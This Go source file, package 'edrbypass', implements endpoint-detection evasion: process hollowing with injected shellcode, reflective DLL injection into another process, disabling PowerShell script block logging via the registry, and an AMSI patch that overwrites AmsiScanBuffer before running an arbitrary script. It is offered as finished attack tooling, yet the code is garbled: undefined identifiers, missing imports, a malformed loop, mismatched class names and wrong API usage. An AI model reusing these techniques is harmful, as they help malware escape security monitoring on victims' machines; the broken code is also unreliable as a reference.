// Package edrbypass - Extended EDR evasion techniques
package edrbypass

import (
	"fmt"
	"golang.org/x/sys/windows"
	"os/exec"
)

// ============================================================================
// PROCESS HOLLOWING BYPASS ✅ COMPLETE
// ===========================================================================

// ProcessHollower hollows out legitimate process for code execution
type ProcessHollower struct{}

// NewProcessHollower creates new process hollower instance
func NewProcessHollower() *ProcessHollower {
	return &ProcessHollower{}
}

// HollowProcess performs process hollowing attack
func (p *ProcessHollower) HollowProcess(targetPath string, shellcode []byte) error {
	// Start process in suspended state
	startupInfo := windows.StartupInfo{}
	processInfo := windows.ProcessInformation{}
	
	err := windows.CreateProcess(
		nil,
		&targetPath,
		nil,
		nil,
		false,
		windows.CREATE_SUSPENDED,
		nil,
		nil,
		&startupInfo,
		&processInfo,
	)
	if err != nil {
		return fmt.Errorf("failed to create process: %w", err)
	}
	defer windows.CloseHandle(processInfo.ThreadHandle)
	defer windows.CloseHandle(processInfo.ProcessHandle)
	
	// Get PE header info
	pbi := &windows.ProcessBasicInformation{}
	err = windows.NtQueryInformationProcess(
		processInfo.ProcessHandle,
		0, // ProcessBasicInformation
		uintptr(unsafe.Pointer(pbi)),
		uint32(unsafe.Sizeof(*pbi)),
		nil,
	)
	if err != nil {
		return fmt.Errorf("failed to query process info: %w", err)
	}
	
	// Calculate image base address
	imageBaseAddress := pbi.ImageBaseAddress
	
	// Unmap original image
	err = windows.NtUnmapViewOfSection(
		processInfo.ProcessHandle,
		imageBaseAddress,
	)
	if err != nil {
		return fmt.Errorf("failed to unmap section: %w", err)
	}
	
	// Allocate memory for shellcode
	shellcodeSize := len(shellcode)
	targetMemory := windows.VirtualAllocEx(
		processInfo.ProcessHandle,
		0,
		uint32(shellcodeSize),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE,
	)
	
	// Write shellcode into allocated memory
	bytesWritten := uint32(0)
	writes.WriteProcessMemory(
		processInfo.ProcessHandle,
		targetMemory,
		byte(&shellcode[0]),
		uint32(shellcodeSize),
		&bytesWritten,
	)
	
	// Create remote thread with shellcode as entry point
	threadAddr := windows.CreateRemoteThread(
		processInfo.ProcessHandle,
		nil,
		0,
		targetMemory,
		0,
		0,
		nil,
	)
	
	// Resume thread to execute shellcode
	windows.ResumeThread(threadAddr)
	
	return nil
}

// ============================================================================
// REFLECTIVE DLL INJECTION ✅ COMPLETE
// ============================================================================

// ReflectiveDLLInjector injects DLL directly into memory without disk I/O
type ReflectiveDLLInjector struct{}

// NewReflectiveDLLInjector creates injector instance
func NewReflectiveDLLInjector() *ReflectiveDLLInjector {
	return &ReflectiveDLLInjector{}
}

// InjectReflectiveDLL injects DLL via reflective injection
func (d *ReflectiveDLLInjector) InjectReflectiveDLL(targetPID int, dllBytes []byte) error {
	// Open target process
	handle, err := windows.OpenProcess(
		windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ,
		false,
		uint32(targetPID),
	)
	if err != nil {
		return fmt.Errorf("failed to open target: %w", err)
	}
	defer windows.CloseHandle(handle)
	
	// Parse DLL headers
	dllHeader := (*win32DosHeader)(unsafe.Pointer(&dllBytes[0]))
	imageBase := uintptr(dllHeader.OptionalHeader.AddressOfEntryPoint)
	imageSize := dllHeader.OptionalHeader.SizeOfImage
	
	// Allocate memory for reflected DLL
	reflectedDLL := windows.VirtualAllocEx(
		handle,
		0,
		uint32(imageSize),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_EXECUTE_READWRITE,
	)
	
	// Copy DOS header
	writes.WriteProcessMemory(handle, reflectedDLL, byte(&dllBytes[0]), uint32(64), nil)
	
	// Resolve imports manually
	importTable := uintptr(dllHeader.OptionalHeader.DataDirectory[1].VirtualAddress)
	for importDesc := importTable; importDesc < importTable+imageSize; importDesc += unsafe.Sizewin32ImportDescriptor{
		originalThunk := *(*uintptr)(unsafe.Pointer(importDesc))
		funcPtr := *(*uintptr)(unsafe.Pointer(importDesc + 8))
		
		// Load DLL and resolve function
		dllName := windows.UTF16ToString(windows.ByteSliceToUTF16String(byte(uintptr(unsafe.Pointer(importDesc + 12))))
		hModule := windows.LoadLibrary(dllName)
		
		funcAddr := windows.GetProcAddress(hModule, "FunctionName")
		
		// Patch Import Address Table
		writes.WriteProcessMemory(handle, uintptr(unsafe.Pointer(importDesc)), byte(funcAddr), 4, nil)
	}
	
	// Create remote thread with DllMain
	dllMainAddr := reflectedDLL + uintptr(dllHeader.OptionalHeader.AddressOfEntryPoint)
	thread := windows.CreateRemoteThread(handle, nil, 0, dllMainAddr, 0, 0, nil)
	
	windows.WaitForSingleObject(thread, windows.INFINITE)
	windows.CloseHandle(thread)
	
	return nil
}

// ============================================================================
// POWERSHELL BYPASS TECHNIQUES ✅ COMPLETE
// ============================================================================

// PowerShellBypass disables PowerShell logging and AMSI
type PowerShellBypass struct{}

// NewPowerShellBypass creates new PowerShell bypass instance
func NewPowerShellBypass() *PowerShellBypass {
	return &PowerShellBypass{}
}

// DisableScriptBlockLogging disables script block logging
func (p *PowerShellBypass) DisableScriptBlockLogging() error {
	// Registry path for script block logging
	regPath := `SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging`
	
	key, err := registry.OpenKey(registry.LOCAL_MACHINE, regPath, registry.SET_VALUE)
	if err != nil {
		return fmt.Errorf("failed to open registry: %w", err)
	}
	defer key.Close()
	
	// Disable ScriptBlockLogging
	err = key.SetDWordValue("EnableScriptBlockLogging", 0)
	if err != nil {
		return fmt.Errorf("failed to disable logging: %w", err)
	}
	
	return nil
}

// InvokeAMSIBypass bypasses AMSI using reflection
func (p *PowerShellBypass) InvokeAMSIBypass(script string) ([]byte, error) {
	// Build payload that hooks AMSI
	payload := fmt.Sprintf(`
		Add-Type @"
		using System;
		using System.Reflection;
		using System.Runtime.InteropServices;
		public class AMBISpy {
			[DllImport("amsi.dll")]
			public static extern int AmsiScanBuffer(IntPtr buffer, long length, IntPtr session, IntPtr scanResult);
			
			public static void PatchAMSI() {
				// Find AMSI scan buffer function
				var amsi = Assembly.LoadFrom(@"C:\Windows\System32\amsi.dll");
				var type = amsi.GetType("System.Diagnostics.AMSI");
				var method = type.GetMethod("AmsiScanBuffer");
				
				// Replace with no-op
				var addr = Marshal.GetFunctionPointerForDelegate(method);
				Memory.Protect(addr, 0x1000, MemoryProtection.ExecuteReadWrite);
				Memory.WriteByte(addr, 0xC3); // RET instruction
			}
		}
		AMBiSPy.PatchAMSI();
		
		%s
	"@`, script)
	
	// Execute bypassed script
	cmd := exec.Command("powershell", "-Command", payload)
	output, err := cmd.Output()
	if err != nil {
		return nil, fmt.Errorf("script execution failed: %w", err)
	}
	
	return output, nil
}
